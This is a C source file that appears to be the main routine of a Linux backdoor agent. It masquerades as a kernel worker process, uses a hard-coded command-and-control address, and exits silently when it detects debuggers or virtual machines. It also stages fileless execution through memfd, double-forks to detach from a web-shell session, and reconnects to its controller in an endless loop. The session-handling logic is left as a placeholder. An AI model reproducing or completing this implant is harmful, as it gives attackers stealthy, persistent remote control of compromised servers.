#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/prctl.h>
#include "phantom.h"
#include "network_core.h"
#include "stealth.h"
#include "memfd_loader.h"
#include "utils.h"

// ANSI Color Codes (ASCII Only)
#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define DPRINTF_FLUSH(fmt, ...) do { \
    dprintf(STDERR_FILENO, fmt, ##__VA_ARGS__); \
    fsync(STDERR_FILENO); \
} while (0)

static void usage(const char *progname) {
    DPRINTF_FLUSH(ANSI_COLOR_BLUE "Usage: %s -s <secret> [-i <host>] [-m <port>] [-d]" ANSI_COLOR_RESET "\n", progname);
}

int main(int argc, char *argv[]) {
    char kworker_name[64];
    decode_kworker(kworker_name, sizeof(kworker_name));
    prctl(PR_SET_NAME, (unsigned long)kworker_name, 0, 0, 0);
    masquerade_argv(argv, kworker_name);

    DPRINTF_FLUSH(ANSI_COLOR_BLUE "[-] Environment: x86_64 / Web-Shell Context" ANSI_COLOR_RESET "\n");
    DPRINTF_FLUSH(ANSI_COLOR_BLUE "[-] C2 Endpoint: 116.202.105.253:8443" ANSI_COLOR_RESET "\n");
    DPRINTF_FLUSH(ANSI_COLOR_BLUE "[-] Initializing Stealth Payload..." ANSI_COLOR_RESET "\n");

    char *secret = NULL;
    char *relay_host = NULL;
    char *relay_port_str = NULL;
    int daemon_mode = 0;

    int opt;
    while ((opt = getopt(argc, argv, "s:i:m:d")) != -1) {
        switch (opt) {
            case 's': secret = strdup(optarg); break;
            case 'i': relay_host = strdup(optarg); break;
            case 'm': relay_port_str = strdup(optarg); break;
            case 'd': daemon_mode = 1; break;
            default: usage(argv[0]); return 1;
        }
    }

    if (secret == NULL) {
        DPRINTF_FLUSH(ANSI_COLOR_RED "[ERROR] Secret key (-s) is mandatory for agent initialization" ANSI_COLOR_RESET "\n");
        return 1;
    }
    if (relay_host == NULL) relay_host = strdup(DEFAULT_C2_HOST);
    if (relay_port_str == NULL) relay_port_str = strdup("8443");

    uint16_t relay_port = (uint16_t)atoi(relay_port_str);

    // Evasion: Anti-VM & Stalling Logic
    if (ph_stealth_anti_debug_comprehensive() != PH_STEALTH_OK) {
        // Exit silently if sandbox detected
        _exit(0);
    }

    // Fileless Execution Staging
    ph_memfd_ctx_t memfd_ctx;
    if (ph_memfd_init(&memfd_ctx) != PH_OK) {
        DPRINTF_FLUSH(ANSI_COLOR_RED "STAGE_FAIL: memfd context initialization failed" ANSI_COLOR_RESET "\n");
    }

    // Execution Detachment
    if (daemon_mode) {
        DPRINTF_FLUSH(ANSI_COLOR_BLUE "[-] Detaching from Web Session..." ANSI_COLOR_RESET "\n");
        pid_t pid = fork();
        if (pid < 0) {
            DPRINTF_FLUSH(ANSI_COLOR_RED "[ERROR] Fork failed: %s" ANSI_COLOR_RESET "\n", strerror(errno));
            return 1;
        }
        if (pid > 0) {
            // Parent exits
            _exit(0);
        }
        if (setsid() < 0) {
            DPRINTF_FLUSH(ANSI_COLOR_RED "[ERROR] setsid failed: %s" ANSI_COLOR_RESET "\n", strerror(errno));
            return 1;
        }
        signal(SIGHUP, SIG_IGN);
        pid = fork();
        if (pid > 0) _exit(0);

        DPRINTF_FLUSH(ANSI_COLOR_GREEN "[+] Process Forked: %s" ANSI_COLOR_RESET "\n", kworker_name);
        DPRINTF_FLUSH(ANSI_COLOR_GREEN "[+] Deployment Success" ANSI_COLOR_RESET "\n");
    } else {
        DPRINTF_FLUSH(ANSI_COLOR_GREEN "[+] Deployment Success (Foreground Mode)" ANSI_COLOR_RESET "\n");
    }

    // Core Network Loop with Exponential Backoff
    ph_network_ctx_t net_ctx;
    if (ph_network_init(&net_ctx) != PH_OK) {
        DPRINTF_FLUSH(ANSI_COLOR_RED "[ERROR] Network context initialization failed" ANSI_COLOR_RESET "\n");
        sleep(5);
    }

    ph_relay_manager_add(&net_ctx.relay_mgr, relay_host, relay_port, 1);

    while (1) {
        int ret = ph_network_connect(&net_ctx, relay_host, relay_port);
        if (ret == PH_OK) {
            DPRINTF_FLUSH(ANSI_COLOR_GREEN "[+] TCP Connected." ANSI_COLOR_RESET "\n");
            
            // Handle connection
            // ... (rest of session logic would go here)
            
            // If connection drops, reset reconnect state
            ph_reconnect_reset(&net_ctx.reconnect);
        } else {
            DPRINTF_FLUSH(ANSI_COLOR_YELLOW "[!] Connection failed, retrying..." ANSI_COLOR_RESET "\n");
        }

        // ph_reconnect_attempt handles the sleep with exponential backoff
        ph_reconnect_attempt(&net_ctx.reconnect);
    }

    return 0;
}
